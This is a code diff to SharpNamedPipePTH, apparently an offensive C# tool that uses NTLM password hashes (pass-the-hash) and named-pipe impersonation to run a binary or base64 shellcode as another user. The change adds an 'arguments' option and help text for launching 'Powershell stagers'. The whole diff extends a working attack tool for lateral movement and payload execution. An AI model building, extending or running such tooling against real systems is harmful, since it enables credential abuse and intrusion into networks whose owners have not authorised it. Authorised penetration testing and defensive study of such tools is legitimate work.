@@ -19,6 +19,7 @@ namespace SharpNamedPipePTH
             string hash = "";
             bool ForceSMB1 = false;
             string binary = "";
+            string Args = "";
             string shellcode = "";
             
             bool usernamegiven = false;
@@ -65,6 +66,11 @@ namespace SharpNamedPipePTH
                 {
                     binary = arguments.Arguments["binary"];
                     binarygiven = true;
+                }
+
+                if (arguments.Arguments.ContainsKey("arguments"))
+                {
+                    Args = arguments.Arguments["arguments"];
                 }
 
                 if (arguments.Arguments.ContainsKey("forcesmb1"))
@@ -114,13 +120,13 @@ namespace SharpNamedPipePTH
             if (shellcodegiven)
             {
                 byte[] shellcodebytes = Convert.FromBase64String(shellcode);
-                Thread t = new Thread(() => SharpNamedPipePTH.PipeServerImpersonate.ImpersonateClient(pipename, binary, shellcodebytes));
+                Thread t = new Thread(() => SharpNamedPipePTH.PipeServerImpersonate.ImpersonateClient(pipename, binary, shellcodebytes, Args));
                 t.Start();
             }
             else
             {
                 byte[] shellcodebytes = null;
-                Thread t = new Thread(() => SharpNamedPipePTH.PipeServerImpersonate.ImpersonateClient(pipename, binary, shellcodebytes));
+                Thread t = new Thread(() => SharpNamedPipePTH.PipeServerImpersonate.ImpersonateClient(pipename, binary, shellcodebytes, Args));
                 t.Start();
             }
             // Connect to the Named Pipe via NamedPipePTH
@@ -266,9 +272,11 @@ namespace SharpNamedPipePTH
 
         public static void displayHelp(string message)
         {
-            Console.WriteLine("{0} \r\nSharpNamedPipePTH.exe username:<user> domain:<domain>  hash:<ntlm> pipename:<pipename> binary:<binary-Path>\r\n", message);
-            Console.WriteLine("===========================    or for shellcode execution    ===========================");
+            Console.WriteLine("{0} \r\n\r\nSharpNamedPipePTH.exe username:<user> domain:<domain>  hash:<ntlm> pipename:<pipename> binary:<binary-Path>\r\n", message);
+            Console.WriteLine("\r\n===========================    or for shellcode execution    ===========================");
             Console.WriteLine("\r\nSharpNamedPipePTH.exe username:<user> domain:<domain>  hash:<ntlm> pipename:<pipename> shellcode:<base64shellcode>");
+            Console.WriteLine("\r\n======================  or argument usage for Powershell stagers  ======================");
+            Console.WriteLine("\r\nSharpNamedPipePTH.exe username:<user> domain:<domain>  hash:<ntlm> pipename:<pipename> binary:<binary> arguments:<arguments>");
             return;
         }
     }
